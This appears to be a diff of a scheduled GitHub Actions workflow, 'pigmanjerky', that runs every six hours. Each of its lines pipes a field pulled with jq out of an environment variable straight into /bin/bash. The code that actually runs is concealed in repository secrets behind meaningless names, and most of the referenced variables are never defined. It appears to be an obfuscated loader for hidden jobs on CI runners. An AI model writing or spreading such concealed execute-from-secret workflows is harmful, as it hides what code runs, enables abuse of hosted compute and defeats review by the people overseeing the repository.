@@ -1,24 +1,30 @@
 name: pigmanjerky
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 3/6 * * *'
-
+    - cron: '4 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pigmanjerky
         env:
-          tvhd135: ${{ secrets.tvhd135 }}
+          tm9911: ${{ secrets.tm9911 }}
         run: |
-          echo $tvhd135 | jq -r .e9267 | /bin/bash
-          echo $orfu524 | jq -r .buas3230 | /bin/bash
-          echo $sjzxj39 | jq -r .jxe2518 | /bin/bash
-          echo $xs22 | jq -r .nmc31 | /bin/bash
-          echo $c61848 | jq -r .k279 | /bin/bash
-          echo $yyg17798 | jq -r .rmoct18221 | /bin/bash
+          echo $tm9911 | jq -r .iolpe16210 | /bin/bash
+          echo $asa147 | jq -r .cozb79888 | /bin/bash
+          echo $jgjy59 | jq -r .pxh6 | /bin/bash
+          echo $pvj89547 | jq -r .rzku49615 | /bin/bash
+          echo $janj91181 | jq -r .wlee3973 | /bin/bash
+          echo $rmq247 | jq -r .axqru039 | /bin/bash
+          echo $ez713 | jq -r .ah57 | /bin/bash
+          echo $e38187 | jq -r .pfawn10 | /bin/bash
+          echo $bjo27 | jq -r .pyayk9202 | /bin/bash
+          echo $k9249 | jq -r .kbjv87019 | /bin/bash
+          echo $eeu9203 | jq -r .jir926 | /bin/bash
+          echo $x05 | jq -r .ve6523 | /bin/bash
+          echo $urgbd2 | jq -r .c41 | /bin/bash
+          echo $yw9333 | jq -r .uleq25819 | /bin/bash
+          echo $fya9 | jq -r .icg06 | /bin/bash
 
